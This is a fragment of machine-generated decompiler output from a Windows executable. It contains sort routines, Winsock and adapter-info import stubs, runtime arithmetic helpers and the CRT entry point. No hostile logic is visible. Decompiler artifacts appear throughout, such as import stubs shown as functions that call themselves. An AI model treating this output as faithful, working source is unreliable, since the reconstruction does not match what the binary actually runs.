        if (uVar5 < uVar1) {
          uVar5 = uVar1;
        }
      }
    }
    else {
      if ((uVar1 <= uVar5) && (uVar5 = uVar1, uVar1 <= uVar2)) goto LAB_004096c8;
    }
    while( true ) {
      uVar1 = *param_2_00;
      while (uVar1 < uVar5) {
        uVar1 = param_2_00[1];
        param_2_00 = param_2_00 + 1;
      }
      uVar1 = puVar4[-1];
      while (puVar3 = puVar4 + -1, uVar5 < uVar1) {
        uVar1 = puVar4[-2];
        puVar4 = puVar3;
      }
      if (puVar3 <= param_2_00) break;
      uVar1 = *param_2_00;
      *param_2_00 = *puVar3;
      *puVar3 = uVar1;
      puVar4 = puVar3;
      param_2_00 = param_2_00 + 1;
    }
    if ((int)((uint)((int)param_2_00 - (int)param_1) & 0xfffffffc) <
        (int)((uint)((int)param_2 - (int)param_2_00) & 0xfffffffc)) {
      FUN_00409680(param_1,param_2_00);
    }
    else {
      FUN_00409680(param_2_00,param_2);
      param_2 = param_2_00;
      param_2_00 = param_1;
    }
    puVar4 = (uint *)((int)param_2 - (int)param_2_00);
    param_1 = param_2_00;
  } while( true );
}

void __cdecl FUN_00409750(uint *param_1,uint *param_2) {
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  if (param_1 != param_2) {
    puVar4 = param_1 + 1;
    while (puVar4 != param_2) {
      uVar1 = *puVar4;
      puVar3 = puVar4;
      if (uVar1 < *param_1) {
        while (param_1 != puVar3) {
          *puVar3 = puVar3[-1];
          puVar3 = puVar3 + -1;
        }
        *param_1 = uVar1;
      }
      else {
        uVar2 = puVar4[-1];
        while (uVar1 < uVar2) {
          *puVar3 = uVar2;
          uVar2 = puVar3[-2];
          puVar3 = puVar3 + -1;
        }
        *puVar3 = uVar1;
      }
      puVar4 = puVar4 + 1;
    }
  }
  return;
}

void Ordinal_3(void) {
                    // WARNING: Could not recover jumptable at 0x004097b0. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_3();
  return;
}

void Ordinal_16(void) {
                    // WARNING: Could not recover jumptable at 0x004097b6. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_16();
  return;
}

void Ordinal_19(void) {
                    // WARNING: Could not recover jumptable at 0x004097bc. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_19();
  return;
}

void Ordinal_4(void) {
                    // WARNING: Could not recover jumptable at 0x004097c2. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_4();
  return;
}

void Ordinal_23(void) {
                    // WARNING: Could not recover jumptable at 0x004097c8. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_23();
  return;
}

void Ordinal_9(void) {
                    // WARNING: Could not recover jumptable at 0x004097ce. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_9();
  return;
}

void Ordinal_11(void) {
                    // WARNING: Could not recover jumptable at 0x004097d4. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_11();
  return;
}

void Ordinal_18(void) {
                    // WARNING: Could not recover jumptable at 0x004097da. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_18();
  return;
}

void Ordinal_10(void) {
                    // WARNING: Could not recover jumptable at 0x004097e0. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_10();
  return;
}

void Ordinal_12(void) {
                    // WARNING: Could not recover jumptable at 0x004097e6. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_12();
  return;
}

void Ordinal_115(void) {
                    // WARNING: Could not recover jumptable at 0x004097ec. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_115();
  return;
}

void Ordinal_14(void) {
                    // WARNING: Could not recover jumptable at 0x004097f2. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_14();
  return;
}

void Ordinal_8(void) {
                    // WARNING: Could not recover jumptable at 0x004097f8. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_8();
  return;
}

void __cdecl FUN_004097fe(void *param_1) {
  free(param_1);
  return;
}

void GetPerAdapterInfo(void) {
                    // WARNING: Could not recover jumptable at 0x0040980a. Too many branches
                    // WARNING: Treating indirect jump as call
  GetPerAdapterInfo();
  return;
}

void GetAdaptersInfo(void) {
                    // WARNING: Could not recover jumptable at 0x00409810. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00409816(_onexit_t param_1) {
  if (_DAT_0070f898 == -1) {
    _onexit(param_1);
    return;
  }
  __dllonexit(param_1,&DAT_0070f898,&DAT_0070f894);
  return;
}

int __cdecl FUN_00409842(_onexit_t param_1) {
  int iVar1;
  
  iVar1 = FUN_00409816(param_1);
  return (uint)(iVar1 != 0) - 1;
}

// WARNING: Unable to track spacebase fully for stack

void FUN_00409860(void) {
  uint in_EAX;
  undefined *puVar1;
  undefined4 local_res0;
  
  puVar1 = &stack0x00000004;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = local_res0;
  return;
}

void _ftol(void) {
                    // WARNING: Could not recover jumptable at 0x00409890. Too many branches
                    // WARNING: Treating indirect jump as call
  _ftol();
  return;
}

// Library Function - Single Match
// Name: __allrem
// Library: Visual Studio

undefined8 __allrem(uint param_1,uint param_2,uint param_3,uint param_4) {
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  bool bVar12;
  bool bVar13;
  
  bVar13 = (int)param_2 < 0;
  if (bVar13) {
    bVar12 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar12 - param_2;
  }
  uVar11 = (uint)bVar13;
  if ((int)param_4 < 0) {
    bVar13 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar13 - param_4;
  }
  uVar3 = param_1;
  uVar4 = param_3;
  uVar8 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    iVar5 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) %
                 (ulonglong)param_3);
    iVar6 = 0;
    if ((int)(uVar11 - 1) < 0) goto LAB_0040994d;
  }
  else {
    do {
      uVar10 = uVar9 >> 1;
      uVar4 = uVar4 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar8 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar8 = uVar7;
      uVar9 = uVar10;
    } while (uVar10 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar4;
    uVar3 = (int)uVar1 * param_4;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_3;
    uVar8 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar9 = uVar8 + uVar3;
    if (((CARRY4(uVar8,uVar3)) || (param_2 < uVar9)) || ((param_2 <= uVar9 && (param_1 < uVar4)))) {
      bVar13 = uVar4 < param_3;
      uVar4 = uVar4 - param_3;
      uVar9 = (uVar9 - param_4) - (uint)bVar13;
    }
    iVar5 = uVar4 - param_1;
    iVar6 = (uVar9 - param_2) - (uint)(uVar4 < param_1);
    if (-1 < (int)(uVar11 - 1)) goto LAB_0040994d;
  }
  bVar13 = iVar5 != 0;
  iVar5 = -iVar5;
  iVar6 = -(uint)bVar13 - iVar6;
LAB_0040994d:
  return CONCAT44(iVar6,iVar5);
}

// Library Function - Single Match
// Name: __alldiv
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4) {
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar9;
  bool bVar10;
  
  bVar10 = (int)param_2 < 0;
  if (bVar10) {
    bVar9 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar9 - param_2;
  }
  if ((int)param_4 < 0) {
    bVar10 = (bool)(bVar10 + '\x01');
    bVar9 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar9 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar8 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar8 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar8 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (bVar10 == true) {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl operator_new(uint param_1) {
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00409a10. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)operator_new();
  return pvVar1;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void) {
  undefined4 *puVar1;
  uint nCmdShow;
  HMODULE hInstance;
  undefined4 *in_FS_OFFSET;
  HINSTANCE hPrevInstance;
  PWSTR pCmdLine;
  PWSTR local_78;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_0040a1a0;
  puStack16 = &DAT_00409ba2;
  uStack20 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack20;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  __set_app_type(2);
  _DAT_0070f894 = 0xffffffff;
  _DAT_0070f898 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0070f88c;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0070f888;
  _DAT_0070f890 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_00409ba1();
  if (_DAT_00431410 == 0) {
    __setusermatherr(&LAB_00409b9e);
  }
  FUN_00409b8c();
  _initterm(&DAT_0040b00c,&DAT_0040b010);
  local_70 = DAT_0070f884;
  __getmainargs(&local_64,&local_74,&local_68,_DoWildCard_0070f880,&local_70);
  _initterm(&DAT_0040b000,&DAT_0040b008);
  local_78 = *(PWSTR *)_acmdln_exref;
  if (*(byte *)local_78 != 0x22) {
    do {
      if (*(byte *)local_78 < 0x21) goto LAB_00409b09;
      local_78 = (PWSTR)((int)local_78 + 1);
    } while( true );
  }
  do {
    local_78 = (PWSTR)((int)local_78 + 1);
    if (*(byte *)local_78 == 0) break;
  } while (*(byte *)local_78 != 0x22);
  if (*(byte *)local_78 != 0x22) goto LAB_00409b09;
  do {
    local_78 = (PWSTR)((int)local_78 + 1);
LAB_00409b09:
    pCmdLine = local_78;
  } while ((*(byte *)local_78 != 0) && (*(byte *)local_78 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA((LPSTARTUPINFOA)&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    nCmdShow = 10;
  }
  else {
    nCmdShow = (uint)local_60.wShowWindow;
  }
  hPrevInstance = (HINSTANCE)0x0;
  hInstance = GetModuleHandleA((LPCSTR)0x0);
  local_6c = WinMain((HINSTANCE)hInstance,hPrevInstance,pCmdLine,nCmdShow);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl free(void *_Memory) {
                    // WARNING: Could not recover jumptable at 0x00409b74. Too many branches
                    // WARNING: Treating indirect jump as call
  free();
  return;
}

void __dllonexit(void) {
                    // WARNING: Could not recover jumptable at 0x00409b7a. Too many branches
                    // WARNING: Treating indirect jump as call
  __dllonexit();
  return;
}

void _initterm(void) {
                    // WARNING: Could not recover jumptable at 0x00409b86. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}

void FUN_00409b8c(void) {
  _controlfp(0x10000,0x30000);
  return;
}

void FUN_00409ba1(void) {
  return;
}

// WARNING: Exceeded maximum restarts with more pending

uint __cdecl _controlfp(uint _NewValue,uint _Mask) {
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00409ba8. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp();
  return uVar1;
}

void Unwind_00409bb0(void) {
  int unaff_EBP;
  
  FUN_004097fe(*(void **)(unaff_EBP + -0x18));
  *(undefined4 *)(unaff_EBP + -0x18) = 0;
  *(undefined4 *)(unaff_EBP + -0x14) = 0;
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  return;
}

void Unwind_00409bb8(void) {
  int unaff_EBP;
  
  FUN_004097fe(*(void **)(unaff_EBP + -0x28));
  *(undefined4 *)(unaff_EBP + -0x28) = 0;
  *(undefined4 *)(unaff_EBP + -0x24) = 0;
  *(undefined4 *)(unaff_EBP + -0x20) = 0;
  return;
}
